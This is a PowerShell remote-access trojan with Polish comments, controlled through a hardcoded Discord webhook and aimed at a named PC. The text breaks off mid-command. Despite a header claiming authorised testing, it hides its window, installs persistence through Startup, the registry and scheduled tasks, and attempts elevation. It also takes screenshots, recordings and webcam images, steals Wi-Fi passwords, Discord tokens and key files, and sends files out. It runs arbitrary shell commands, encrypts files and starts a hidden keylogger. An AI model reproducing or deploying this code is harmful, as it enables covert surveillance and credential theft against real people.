# ===================================================================
# TYMUSC2 v2.0 - ZDALNE STEROWANIE PRZEZ DISCORD WEBHOOK
# TYLKO DLA AUTORYZOWANYCH TESTOW BEZPIECZENSTWA
# ===================================================================

param([switch]$Startup)

# -- KONFIGURACJA --
$webhookUrl = "https://discord.com/api/webhooks/1512766627438133309/Ei7ZQANDz4QPN6W0BTFp3oEs6O1SCa4XvMX0XS8Yr42MiEuQXsWE1yQQutuYTuCteEuI"
$checkInterval = 3
$victimName = "MIKOLAJ-PC"
$dataDir = "$env:TEMP\tymushacker_data"
$encryptionKey = "TYMUSC2_SECRET_KEY_2024"

# Ukryj konsole przy starcie
if ($Startup) {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    '
    $cPtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($cPtr, 0) | Out-Null
}

# ===== FUNKCJE POMOCNICZE =====

function Send-DiscordMessage {
    param([string]$Content, [string]$File)
    $body = @{
        content = $Content
        username = "TYMUSC2 - $victimName"
    }
    try {
        if ($File -and (Test-Path $File)) {
            $form = @{
                payload_json = ($body | ConvertTo-Json -Depth 5)
                file = Get-Item -Path $File
            }
            Invoke-RestMethod -Uri "$webhookUrl?wait=true" -Method Post -Form $form -ErrorAction SilentlyContinue | Out-Null
        } else {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
        }
    } catch {}
}

function Send-DiscordEmbed {
    param([string]$Title, [string]$Description, [int]$Color = 16711680)
    $embed = @{
        title = $Title
        description = $Description
        color = $Color
        footer = @{ text = "TYMUSC2 v2.0" }
        timestamp = (Get-Date -Format "o")
    }
    $body = @{ embeds = @($embed); username = "TYMUSC2 - $victimName" }
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($body | ConvertTo-Json -Depth 5) -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

function Get-LastCommand {
    try {
        $msgs = Invoke-RestMethod -Uri "$webhookUrl/messages?limit=15" -Method Get -ErrorAction SilentlyContinue
        if ($msgs) {
            for ($i = $msgs.Count - 1; $i -ge 0; $i--) {
                $m = $msgs[$i]
                if ($m.author.username -ne "TYMUSC2 - $victimName") {
                    $content = $m.content.Trim()
                    if ($content -match '^!') { return $content }
                }
            }
        }
    } catch {}
    return $null
}

function Get-ComprehensiveInfo {
    $info = @{}
    try {
        $ipInfo = Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -ErrorAction SilentlyContinue
        $info.PublicIP = $ipInfo.ip
        $geo = Invoke-RestMethod -Uri "http://ip-api.com/json/$($ipInfo.ip)" -ErrorAction SilentlyContinue
        if ($geo) {
            $info.Location = "$($geo.city), $($geo.regionName), $($geo.country)"
            $info.ISP = $geo.isp
            $info.Lat = $geo.lat
            $info.Lon = $geo.lon
            $info.Timezone = $geo.timezone
        }
    } catch {}
    try {
        $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
        if (-not $os) { $os = Get-WmiObject Win32_OperatingSystem }
        $info.ComputerName = $env:COMPUTERNAME
        $info.Username = $env:USERNAME
        $info.Domain = $env:USERDOMAIN
        $info.OS = $os.Caption
        $info.OSVersion = $os.Version
        $info.Architecture = $os.OSArchitecture
        $info.LastBoot = $os.LastBootUpTime
        $info.SerialNumber = $os.SerialNumber
    } catch {}
    try {
        $cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue
        if (-not $cpu) { $cpu = Get-WmiObject Win32_Processor }
        $info.CPU = "$($cpu.Name) - $($cpu.NumberOfCores)rdzen/$($cpu.NumberOfLogicalProcessors)watkow"
        $info.CPU_Load = ($cpu | Measure-Object -Property LoadPercentage -Average).Average
        $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
        if (-not $cs) { $cs = Get-WmiObject Win32_ComputerSystem }
        $info.RAM_GB = [math]::Round($cs.TotalPhysicalMemory / 1GB, 1)
        $info.Manufacturer = $cs.Manufacturer
        $info.Model = $cs.Model
        $gpu = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
        if (-not $gpu) { $gpu = Get-WmiObject Win32_VideoController }
        $info.GPU = ($gpu | ForEach-Object { "$($_.Name)" }) -join ", "
    } catch {}
    try {
        $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction SilentlyContinue
        if (-not $disk) { $disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'" }
        $info.DiskTotalGB = [math]::Round($disk.Size / 1GB, 1)
        $info.DiskFreeGB = [math]::Round($disk.FreeSpace / 1GB, 1)
        $info.DiskUsedPct = [math]::Round(($disk.Size - $disk.FreeSpace) / $disk.Size * 100, 1)
    } catch {}
    try {
        $adapters = Get-NetAdapter -Physical | Where-Object { $_.Status -eq 'Up' }
        $ipList = @(); $macList = @()
        foreach ($a in $adapters) {
            $ip = Get-NetIPAddress -InterfaceIndex $a.ifIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue
            if ($ip) { $ipList += $ip.IPAddress }
            $macList += $a.MacAddress
        }
        $info.LocalIPs = $ipList -join ", "
        $info.MAC = $macList -join ", "
    } catch {}
    try { $info.ProcessCount = (Get-Process).Count } catch {}
    try {
        $boot = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
        if ($boot -and $boot.LastBootUpTime) {
            $uptime = (Get-Date) - $boot.LastBootUpTime
            $info.Uptime = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"
        }
    } catch {}
    try {
        $av = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
        if ($av) { $info.Antivirus = ($av.displayName) -join ", " }
    } catch {}
    try {
        $fw = Get-NetFirewallProfile | Where-Object { $_.Enabled }
        $info.Firewall = ($fw.Name) -join ", "
    } catch {}
    try {
        $battery = Get-CimInstance Win32_Battery -ErrorAction SilentlyContinue
        if ($battery) {
            $info.BatteryPct = $battery.EstimatedChargeRemaining
            $info.BatteryStatus = switch ($battery.BatteryStatus) {
                1 { "Rozladowywanie" }
                2 { "Ladowanie AC" }
                3 { "Pelnia" }
                default { "Nieznany" }
            }
        }
    } catch {}
    return $info
}

function Take-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
    $graphics.Dispose()
    $path = "$env:TEMP\ss_$([DateTime]::Now.Ticks).png"
    $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
    $bitmap.Dispose()
    return $path
}

function Take-AllScreenshots {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screens = [System.Windows.Forms.Screen]::AllScreens
    $paths = @()
    $i = 0
    foreach ($screen in $screens) {
        $bounds = $screen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $g = [System.Drawing.Graphics]::FromImage($bitmap)
        $g.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
        $g.Dispose()
        $path = "$env:TEMP\ss_$($i)_$([DateTime]::Now.Ticks).png"
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        $bitmap.Dispose()
        $paths += $path
        $i++
    }
    if ($paths.Count -gt 1) {
        $zipPath = "$env:TEMP\ss_all_$([DateTime]::Now.Ticks).zip"
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        $zip = [System.IO.Compression.ZipFile]::Open($zipPath, [System.IO.Compression.ZipArchiveMode]::Create)
        foreach ($p in $paths) {
            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $p, [System.IO.Path]::GetFileName($p)) | Out-Null
        }
        $zip.Dispose()
        foreach ($p in $paths) { Remove-Item $p -Force -ErrorAction SilentlyContinue }
        return $zipPath
    }
    return $paths[0]
}

function Start-Recording {
    $rd = "$env:TEMP\rec_$([DateTime]::Now.Ticks)"
    New-Item -ItemType Directory -Path $rd -Force | Out-Null
    $mf = "$rd\active.txt"
    Set-Content -Path $mf -Value "ACTIVE"
    $sb = {
        param($dir, $marker)
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $fn = 0
        while ((Test-Path $marker) -and $fn -lt 3000) {
            try {
                $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bm = New-Object System.Drawing.Bitmap $b.Width, $b.Height
                $g = [System.Drawing.Graphics]::FromImage($bm)
                $g.CopyFromScreen($b.X, $b.Y, 0, 0, $b.Size)
                $g.Dispose()
                $fp = "$dir\frame_$fn.jpg"
                $enc = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.FormatID -eq [System.Drawing.Imaging.ImageFormat]::Jpeg.Guid }
                $ep = New-Object System.Drawing.Imaging.EncoderParameters(1)
                $ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 50L)
                $bm.Save($fp, $enc, $ep)
                $bm.Dispose()
                $fn++
                Start-Sleep -Milliseconds 100
            } catch { Start-Sleep -Milliseconds 500 }
        }
    }
    $ps = [PowerShell]::Create()
    [void]$ps.AddScript($sb)
    [void]$ps.AddParameter("dir", $rd)
    [void]$ps.AddParameter("marker", $mf)
    [void]$ps.BeginInvoke()
    return $mf, $rd
}

function Stop-Recording {
    param([string]$MarkerFile, [string]$RecordDir)
    if ($MarkerFile -and (Test-Path $MarkerFile)) { Remove-Item $MarkerFile -Force }
    Start-Sleep -Seconds 3
    $zipPath = "$env:TEMP\rec_$([DateTime]::Now.Ticks).zip"
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($RecordDir, $zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)
    Remove-Item "$RecordDir\*.jpg" -Force -ErrorAction SilentlyContinue
    return $zipPath
}

function Get-WiFiPasswords {
    $profiles = netsh wlan show profiles | Select-String "Profile\s*:\s(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
    $r = @()
    foreach ($p in $profiles) {
        try {
            $d = netsh wlan show profile name="$p" key=clear
            $pass = ($d | Select-String "Key Content\s*:\s(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() })
            $r += @{ Profile = $p; Password = if ($pass) { $pass } else { "(brak)" } }
        } catch {}
    }
    return $r
}

function Get-DiscordTokens {
    $tokens = @()
    $paths = @(
        "$env:APPDATA\Discord\Local Storage\leveldb",
        "$env:APPDATA\discordptb\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Discord\Local Storage\leveldb",
        "$env:LOCALAPPDATA\discordptb\Local Storage\leveldb",
        "$env:LOCALAPPDATA\discordcanary\Local Storage\leveldb"
    )
    $regex = '[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}'
    foreach ($path in $paths) {
        if (Test-Path $path) {
            $files = Get-ChildItem -Path $path -Filter "*.ldb" -ErrorAction SilentlyContinue
            foreach ($f in $files) {
                try {
                    $content = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue
                    if ($content) {
                        $matches = [regex]::Matches($content, $regex)
                        foreach ($m in $matches) { $tokens += @{ Path = $path; Token = $m.Value } }
                    }
                } catch {}
            }
        }
    }
    return $tokens
}

function Persist-Script {
    $scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\tymushacker.ps1"
    $batPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\tymushacker.bat"
    $vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\tymushacker.vbs"
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $taskName = "TYMUSC2_Update"
    try {
        if (-not (Test-Path $scriptPath)) { Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force }
        $batContent = "@echo off`npowershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`" -Startup"
        Set-Content -Path $batPath -Value $batContent -Force
        $vbsContent = "CreateObject(`"WScript.Shell`").Run `"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`" -Startup`", 0, False"
        Set-Content -Path $vbsPath -Value $vbsContent -Force
        Set-ItemProperty -Path $regPath -Name "TYMUSC2" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`" -Startup" -Force
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`" -Startup"
        $trigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force -ErrorAction SilentlyContinue
        return "Persistencja zainstalowana (Startup, Rejestr, Task Scheduler)"
    } catch { return "Blad persistencji: $($_.Exception.Message)" }
}

function Remove-Persistence {
    $paths = @(
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\tymushacker.ps1",
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\tymushacker.bat",
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\tymushacker.vbs"
    )
    foreach ($p in $paths) { Remove-Item $p -Force -ErrorAction SilentlyContinue }
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TYMUSC2" -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "TYMUSC2_Update" -Confirm:$false -ErrorAction SilentlyContinue
    return "Usunieto persistencje"
}

function Elevate-ToAdmin {
    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
    if (-not $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`" -Startup"
        $psi.Verb = "runas"
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        try { [System.Diagnostics.Process]::Start($psi) | Out-Null; return "Nowa instancja jako admin" }
        catch { return "Blad elevation: $($_.Exception.Message)" }
    }
    return "Juz jestes adminem"
}

function Get-NetworkConnections {
    try {
        $conns = Get-NetTCPConnection -ErrorAction SilentlyContinue | Where-Object { $_.State -ne 'Listen' } | Select-Object -First 25
        $r = @()
        foreach ($c in $conns) {
            $proc = (Get-Process -Id $c.OwningProcess -ErrorAction SilentlyContinue).ProcessName
            $r += "$($c.LocalAddress):$($c.LocalPort) -> $($c.RemoteAddress):$($c.RemotePort) [$($c.State)] $proc"
        }
        return $r
    } catch { return @() }
}

function Get-ARP {
    try {
        $arp = arp -a | Select-String "(\d+\.\d+\.\d+\.\d+)\s+([a-f0-9\-]{17})" -AllMatches
        $r = @()
        foreach ($m in $arp.Matches) { $r += "$($m.Groups[1].Value) -> $($m.Groups[2].Value)" }
        return $r
    } catch { return @() }
}

function Search-Files {
    param([string]$Pattern, [string]$Base = "$env:USERPROFILE")
    $exts = @('*.txt','*.doc','*.docx','*.xls','*.xlsx','*.pdf','*.csv','*.cfg','*.config','*.ini','*.kdbx','*.key','*.pem','*.p12','*.pfx','*.rdp','*.vpn','*.ovpn')
    $results = @()
    foreach ($ext in $exts) {
        try {
            $files = Get-ChildItem -Path $Base -Filter $ext -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 5MB } | Select-Object -First 50
            foreach ($f in $files) {
                if ($f.Name -match $Pattern) { $results += $f.FullName }
                elseif ($f.Length -lt 500KB) {
                    try {
                        $c = Get-Content $f.FullName -First 5 -ErrorAction SilentlyContinue
                        if ($c -match $Pattern) { $results += $f.FullName }
                    } catch {}
                }
                if ($results.Count -ge 50) { break }
            }
        } catch {}
        if ($results.Count -ge 50) { break }
    }
    return $results
}

function Set-Wallpaper {
    param([string]$ImagePath)
    if (-not (Test-Path $ImagePath)) { return "Plik nie istnieje" }
    Add-Type @'
using System;
using System.Runtime.InteropServices;
public class WP {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public static void Set(string p) { SystemParametersInfo(20, 0, p, 3); }
}
'@
    try { [WP]::Set($ImagePath); return "Tapeta zmieniona" }
    catch { return "Blad zmiany tapety" }
}

function EncryptFile {
    param([string]$Path)
    if (-not (Test-Path $Path)) { return $null }
    try {
        $data = [System.IO.File]::ReadAllBytes($Path)
        $salt = [System.Text.Encoding]::UTF8.GetBytes("TYMUSC2_SALT_2024")
        $pwd = [System.Text.Encoding]::UTF8.GetBytes($encryptionKey)
        $db = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($pwd, $salt, 10000, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
        $key = $db.GetBytes(32); $iv = $db.GetBytes(16)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key; $aes.IV = $iv; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC; $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $enc = $aes.CreateEncryptor().TransformFinalBlock($data, 0, $data.Length)
        $outPath = "$Path.tymushacker"
        [System.IO.File]::WriteAllBytes($outPath, $salt + $iv + $enc)
        return $outPath
    } catch { return $null }
}

function DecryptFile {
    param([string]$Path)
    if (-not (Test-Path $Path)) { return $null }
    try {
        $data = [System.IO.File]::ReadAllBytes($Path)
        $salt = $data[0..15]; $iv = $data[16..31]; $enc = $data[32..($data.Length - 1)]
        $pwd = [System.Text.Encoding]::UTF8.GetBytes($encryptionKey)
        $db = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($pwd, $salt, 10000, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
        $key = $db.GetBytes(32)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key; $aes.IV = $iv; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC; $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $dec = $aes.CreateDecryptor().TransformFinalBlock($enc, 0, $enc.Length)
        $outPath = $Path -replace '\.tymushacker$', '.decrypted'
        [System.IO.File]::WriteAllBytes($outPath, $dec)
        return $outPath
    } catch { return $null }
}

# ===== FUNKCJA WYKONUJACA KOMENDY =====
function Execute-Command {
    param([string]$Command)

    $response = ""

    switch -Regex ($Command) {
        '^!info$' {
            $i = Get-ComprehensiveInfo
            $response = "FULL INFO - $($i.ComputerName)"
            $response += "`nUser: $($i.Username)@$($i.Domain)"
            $response += "`nOS: $($i.OS) ($($i.Architecture)) v$($i.OSVersion) SN:$($i.SerialNumber)"
            $response += "`nIP: $($i.PublicIP) | Lok: $($i.Location) | ISP: $($i.ISP)"
            $response += "`nCPU: $($i.CPU) (Load: $($i.CPU_Load)%)"
            $response += "`nRAM: $($i.RAM_GB) GB | GPU: $($i.GPU)"
            $response += "`nManufacturer: $($i.Manufacturer) $($i.Model)"
            $response += "`nDisk C: $($i.DiskFreeGB)/$($i.DiskTotalGB) GB ($($i.DiskUsedPct)% uzyte)"
            $response += "`nLocal IPs: $($i.LocalIPs) | MAC: $($i.MAC)"
            $response += "`nProcesy: $($i.ProcessCount) | Uptime: $($i.Uptime)"
            if ($i.BatteryPct) { $response += "`nBattery: $($i.BatteryPct)% ($($i.BatteryStatus))" }
            if ($i.Antivirus) { $response += "`nAV: $($i.Antivirus)" }
            $response += "`nFirewall: $($i.Firewall)"
        }
        '^!sysinfo$' {
            $i = Get-ComprehensiveInfo
            $response = "SYSINFO $($i.ComputerName): $($i.OS) | CPU: $($i.CPU_Load)% | RAM: $($i.RAM_GB)GB | Disk: $($i.DiskFreeGB)/$($i.DiskTotalGB)GB | IP: $($i.PublicIP)"
        }
        '^!ip$' {
            $i = Get-ComprehensiveInfo
            $response = "IP: $($i.PublicIP)`nLok: $($i.Location)`nISP: $($i.ISP)`nKordy: $($i.Lat), $($i.Lon)`nStrefa: $($i.Timezone)"
        }
        '^!screenshot$|^!ss$' {
            $path = Take-Screenshot
            Send-DiscordMessage -Content "SCREENSHOT - $victimName" -File $path
            Remove-Item $path -Force
            $response = "Screenshot wyslany!"
        }
        '^!screenshot_all$|^!ssall$' {
            $path = Take-AllScreenshots
            Send-DiscordMessage -Content "SCREENSHOTS ALL MONITORS - $victimName" -File $path
            Remove-Item $path -Force -ErrorAction SilentlyContinue
            $response = "Screenshots wszystkich monitorow wyslane!"
        }
        '^!webcam$|^!cam$' {
            try {
                $folder = "$env:TEMP\cam_$([DateTime]::Now.Ticks)"
                New-Item -ItemType Directory -Path $folder -Force | Out-Null
                $dm = New-Object -ComObject WIA.DeviceManager -ErrorAction SilentlyContinue
                if ($dm) {
                    $device = $dm.DeviceInfos | Where-Object { $_.Type -eq 2 } | Select-Object -First 1
                    if ($device) {
                        $di = $device.Connect()
                        $item = $di.ExecuteCommand("{E813C0C4-C8A8-4F7A-9E6D-6A8BDE81A9B1}")
                        $path = "$folder\webcam.jpg"
                        $item.Transfer().SaveFile($path)
                        Send-DiscordMessage -Content "WEBCAM - $victimName" -File $path
                        Remove-Item $path -Force; Remove-Item $folder -Force -ErrorAction SilentlyContinue
                        $response = "Zdjecie z kamery wyslane!"
                    } else { $response = "Brak kamery" }
                } else { $response = "Brak dostepu WIA" }
            } catch { $response = "Blad kamery: $($_.Exception.Message)" }
        }
        '^!record$|^!startrecord$' {
            $mf, $rd = Start-Recording
            Set-Content -Path "$dataDir\rec_current.txt" -Value "$mf|$rd"
            $response = "Nagrywanie ROZPOCZETE! Uzyj !stoprecord"
        }
        '^!stoprecord$|^!stop$' {
            $data = Get-Content "$dataDir\rec_current.txt" -ErrorAction SilentlyContinue
            if ($data) {
                $parts = $data.Split('|')
                $zipPath = Stop-Recording -MarkerFile $parts[0] -RecordDir $parts[1]
                if ($zipPath -and (Test-Path $zipPath)) {
                    $size = [math]::Round((Get-Item $zipPath).Length/1MB, 2)
                    Send-DiscordMessage -Content "NAGRANIE - $victimName ($size MB)" -File $zipPath
                    Remove-Item $zipPath -Force; Remove-Item "$dataDir\rec_current.txt" -Force -ErrorAction SilentlyContinue
                    $response = "Nagranie wyslane!"
                } else { $response = "Blad nagrywania" }
            } else { $response = "Brak aktywnego nagrywania" }
        }
        '^!shell (.+)$' {
            $cmd = $matches[1]
            try {
                $output = Invoke-Expression -Command $cmd 2>&1 | Out-String
                if ($output.Length -gt 1900) { $output = $output.Substring(0, 1900) + "...[PRZYCIETO]" }
                $response = "CMD: $cmd`n```$output```"
            } catch { $response = "Blad: $($_.Exception.Message)" }
        }
        '^!ps$|^!processes$' {
            $procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 25
            $response = "TOP 25 PROCESOW:`n"
            foreach ($p in $procs) {
                $response += "$($p.ProcessName) (PID:$($p.Id)) CPU:$([math]::Round($p.CPU,1)) RAM:$([math]::Round($p.WorkingSet/1MB,1))MB`n"
            }
        }
        '^!kill (\d+)$' {
            $pid = [int]$matches[1]
            try {
                $name = (Get-Process -Id $pid -ErrorAction Stop).ProcessName
                Stop-Process -Id $pid -Force
                $response = "Proces $name (PID $pid) zakonczony"
            } catch { $response = "Blad: $($_.Exception.Message)" }
        }
        '^!shutdown$' {
            $response = "WYLACZANIE ZA 10 SEKUND..."
            Send-DiscordMessage -Content $response
            Start-Sleep -Seconds 10
            Stop-Computer -Force; return
        }
        '^!restart$' {
            $response = "RESTART ZA 10 SEKUND..."
            Send-DiscordMessage -Content $response
            Start-Sleep -Seconds 10
            Restart-Computer -Force; return
        }
        '^!msg (.+)$' {
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.MessageBox]::Show($matches[1], "UWAGA!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning) | Out-Null
            $response = "MessageBox: $($matches[1])"
        }
        '^!speak (.+)$|^!voice (.+)$' {
            try {
                Add-Type -AssemblyName System.Speech
                $s = New-Object System.Speech.Synthesis.SpeechSynthesizer
                $s.Rate = -1; $s.Volume = 100
                $s.Speak($matches[1])
                $response = "Mowa: $($matches[1])"
            } catch { $response = "Blad mowy" }
        }
        '^!download (.+)$' {
            $url = $matches[1]
            $fn = [System.IO.Path]::GetFileName($url)
            if (-not $fn) { $fn = "download_$([DateTime]::Now.Ticks).exe" }
            $sp = "$env:TEMP\$fn"
            try {
                try { Invoke-WebRequest -Uri $url -OutFile $sp -ErrorAction Stop }
                catch { (New-Object System.Net.WebClient).DownloadFile($url, $sp) }
                $size = [math]::Round((Get-Item $sp).Length/1KB, 1)
                $response = "Pobrano: $fn ($size KB)"
            } catch { $response = "Blad pobierania: $($_.Exception.Message)" }
        }
        '^!upload (.+)$' {
            $path = $matches[1]
            if (Test-Path $path) {
                $item = Get-Item $path
                $size = [math]::Round($item.Length/1KB, 1)
                Send-DiscordMessage -Content "PLIK - $victimName - $($item.Name) ($size KB)" -File $path
                $response = "Wyslano: $path"
            } else { $response = "Plik nie istnieje: $path" }
        }
        '^!grab (.+)$' {
            $path = $matches[1]
            if (Test-Path $path) {
                $item = Get-Item $path
                if ($item.Length -le 7MB) {
                    $size = [math]::Round($item.Length/1KB, 1)
                    Send-DiscordMessage -Content "GRAB - $victimName - $($item.Name) ($size KB)" -File $path
                    $response = "Wyslano: $path"
                } else {
                    $zipPath = "$env:TEMP\grab_$([DateTime]::Now.Ticks).zip"
                    Add-Type -AssemblyName System.IO.Compression.FileSystem
                    $zip = [System.IO.Compression.ZipFile]::Open($zipPath, [System.IO.Compression.ZipArchiveMode]::Create)
                    [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $path, $item.Name) | Out-Null
                    $zip.Dispose()
                    $size = [math]::Round((Get-Item $zipPath).Length/1MB, 2)
                    Send-DiscordMessage -Content "GRAB ZIP - $victimName - $($item.Name) ($size MB)" -File $zipPath
                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                    $response = "Spakowano i wyslano: $path"
                }
            } else { $response = "Plik nie istnieje: $path" }
        }
        '^!clipboard$|^!cb$' {
            try {
                Add-Type -AssemblyName System.Windows.Forms
                $clip = [System.Windows.Forms.Clipboard]::GetText()
                if ($clip.Length -gt 1000) { $clip = $clip.Substring(0, 1000) + "..." }
                $response = if ($clip) { "SCHOWEK:`n$clip" } else { "Schowek pusty" }
            } catch { $response = "Blad schowka" }
        }
        '^!browse$|^!files$' {
            $dirs = Get-ChildItem "C:\Users\$env:USERNAME" -Directory -ErrorAction SilentlyContinue
            $response = "KATALOGI UZYTKOWNIKA:`n"
            foreach ($d in $dirs) { $response += "$($d.Name)/`n" }
        }
        '^!dir (.+)$' {
            $dir = $matches[1]
            if (Test-Path $dir) {
                $items = Get-ChildItem $dir -ErrorAction SilentlyContinue | Select-Object -First 40
                if ($items) {
                    $response = "ZAWARTOSC: $dir`n"
                    foreach ($item in $items) {
                        if ($item.PSIsContainer) { $response += "[DIR] $($item.Name)`n" }
                        else { $response += "[FILE] $($item.Name) ($([math]::Round($item.Length/1KB,1))KB)`n" }
                    }
                    if ($items.Count -ge 40) { $response += "...[wiecej niz 40]" }
                } else { $response = "Pusty: $dir" }
            } else { $response = "Nie istnieje: $dir" }
        }
        '^!search (.+)$' {
            $results = Search-Files -Pattern $matches[1]
            if ($results.Count -gt 0) {
                $response = "SZUKANIE: $($matches[1])`n"
                foreach ($r in $results) {
                    $response += "$r`n"
                    if ($response.Length -gt 1800) { $response += "...[przycieto $($results.Count) wynikow]"; break }
                }
            } else { $response = "Nie znaleziono: $($matches[1])" }
        }
        '^!keylog$|^!keys$' {
            $klPath = "$env:TEMP\keylog_$([DateTime]::Now.Ticks).txt"
            Set-Content -Path $klPath -Value "KEYLOG START: $(Get-Date)`r`n"
            $clipPath = "$env:TEMP\keylog_clip_$([DateTime]::Now.Ticks).txt"
            $klCode = @'
$logFile = $args[0]; $clipFile = $args[1]; $lastClip = ""
Add-Type @"
using System; using System.Runtime.InteropServices;
public class K {
    [DllImport("user32.dll")] public static extern int GetAsyncKeyState(int i);
}
"@
while($true) {
    for($i=1; $i -le 255; $i++) {
        $s = [K]::GetAsyncKeyState($i)
        if ($s -eq -32767) {
            $key = [char]$i
            Add-Content -Path $logFile -Value ("[" + (Get-Date -Format "HH:mm:ss.fff") + "] " + $key)
        }
    }
    Start-Sleep -Milliseconds 10
    if ((Get-Date).Second % 3 -eq 0) {
        try {
            Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
            $clip = [System.Windows.Forms.Clipboard]::GetText()
            if ($clip -and $clip -ne $lastClip -and $clip.Length -gt 3) {
                $lastClip = $clip
                Add-Content -Path $clipFile -Value ("[CLIP " + (Get-Date -Format "HH:mm:ss") + "] " + $clip.Substring(0, [Math]::Min($clip.Length, 200)))
            }
        } catch {}
    }
}
'@
            Set-Content -Path "$env:TEMP\kl_runner.ps1" -Value $klCode
            Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\kl_runner.ps1`" `"$klPath`" `"$clipPath`"" -WindowStyle Hidden
            Set-Content -Path "$dataDir\kl_file.txt" -Value $klPath
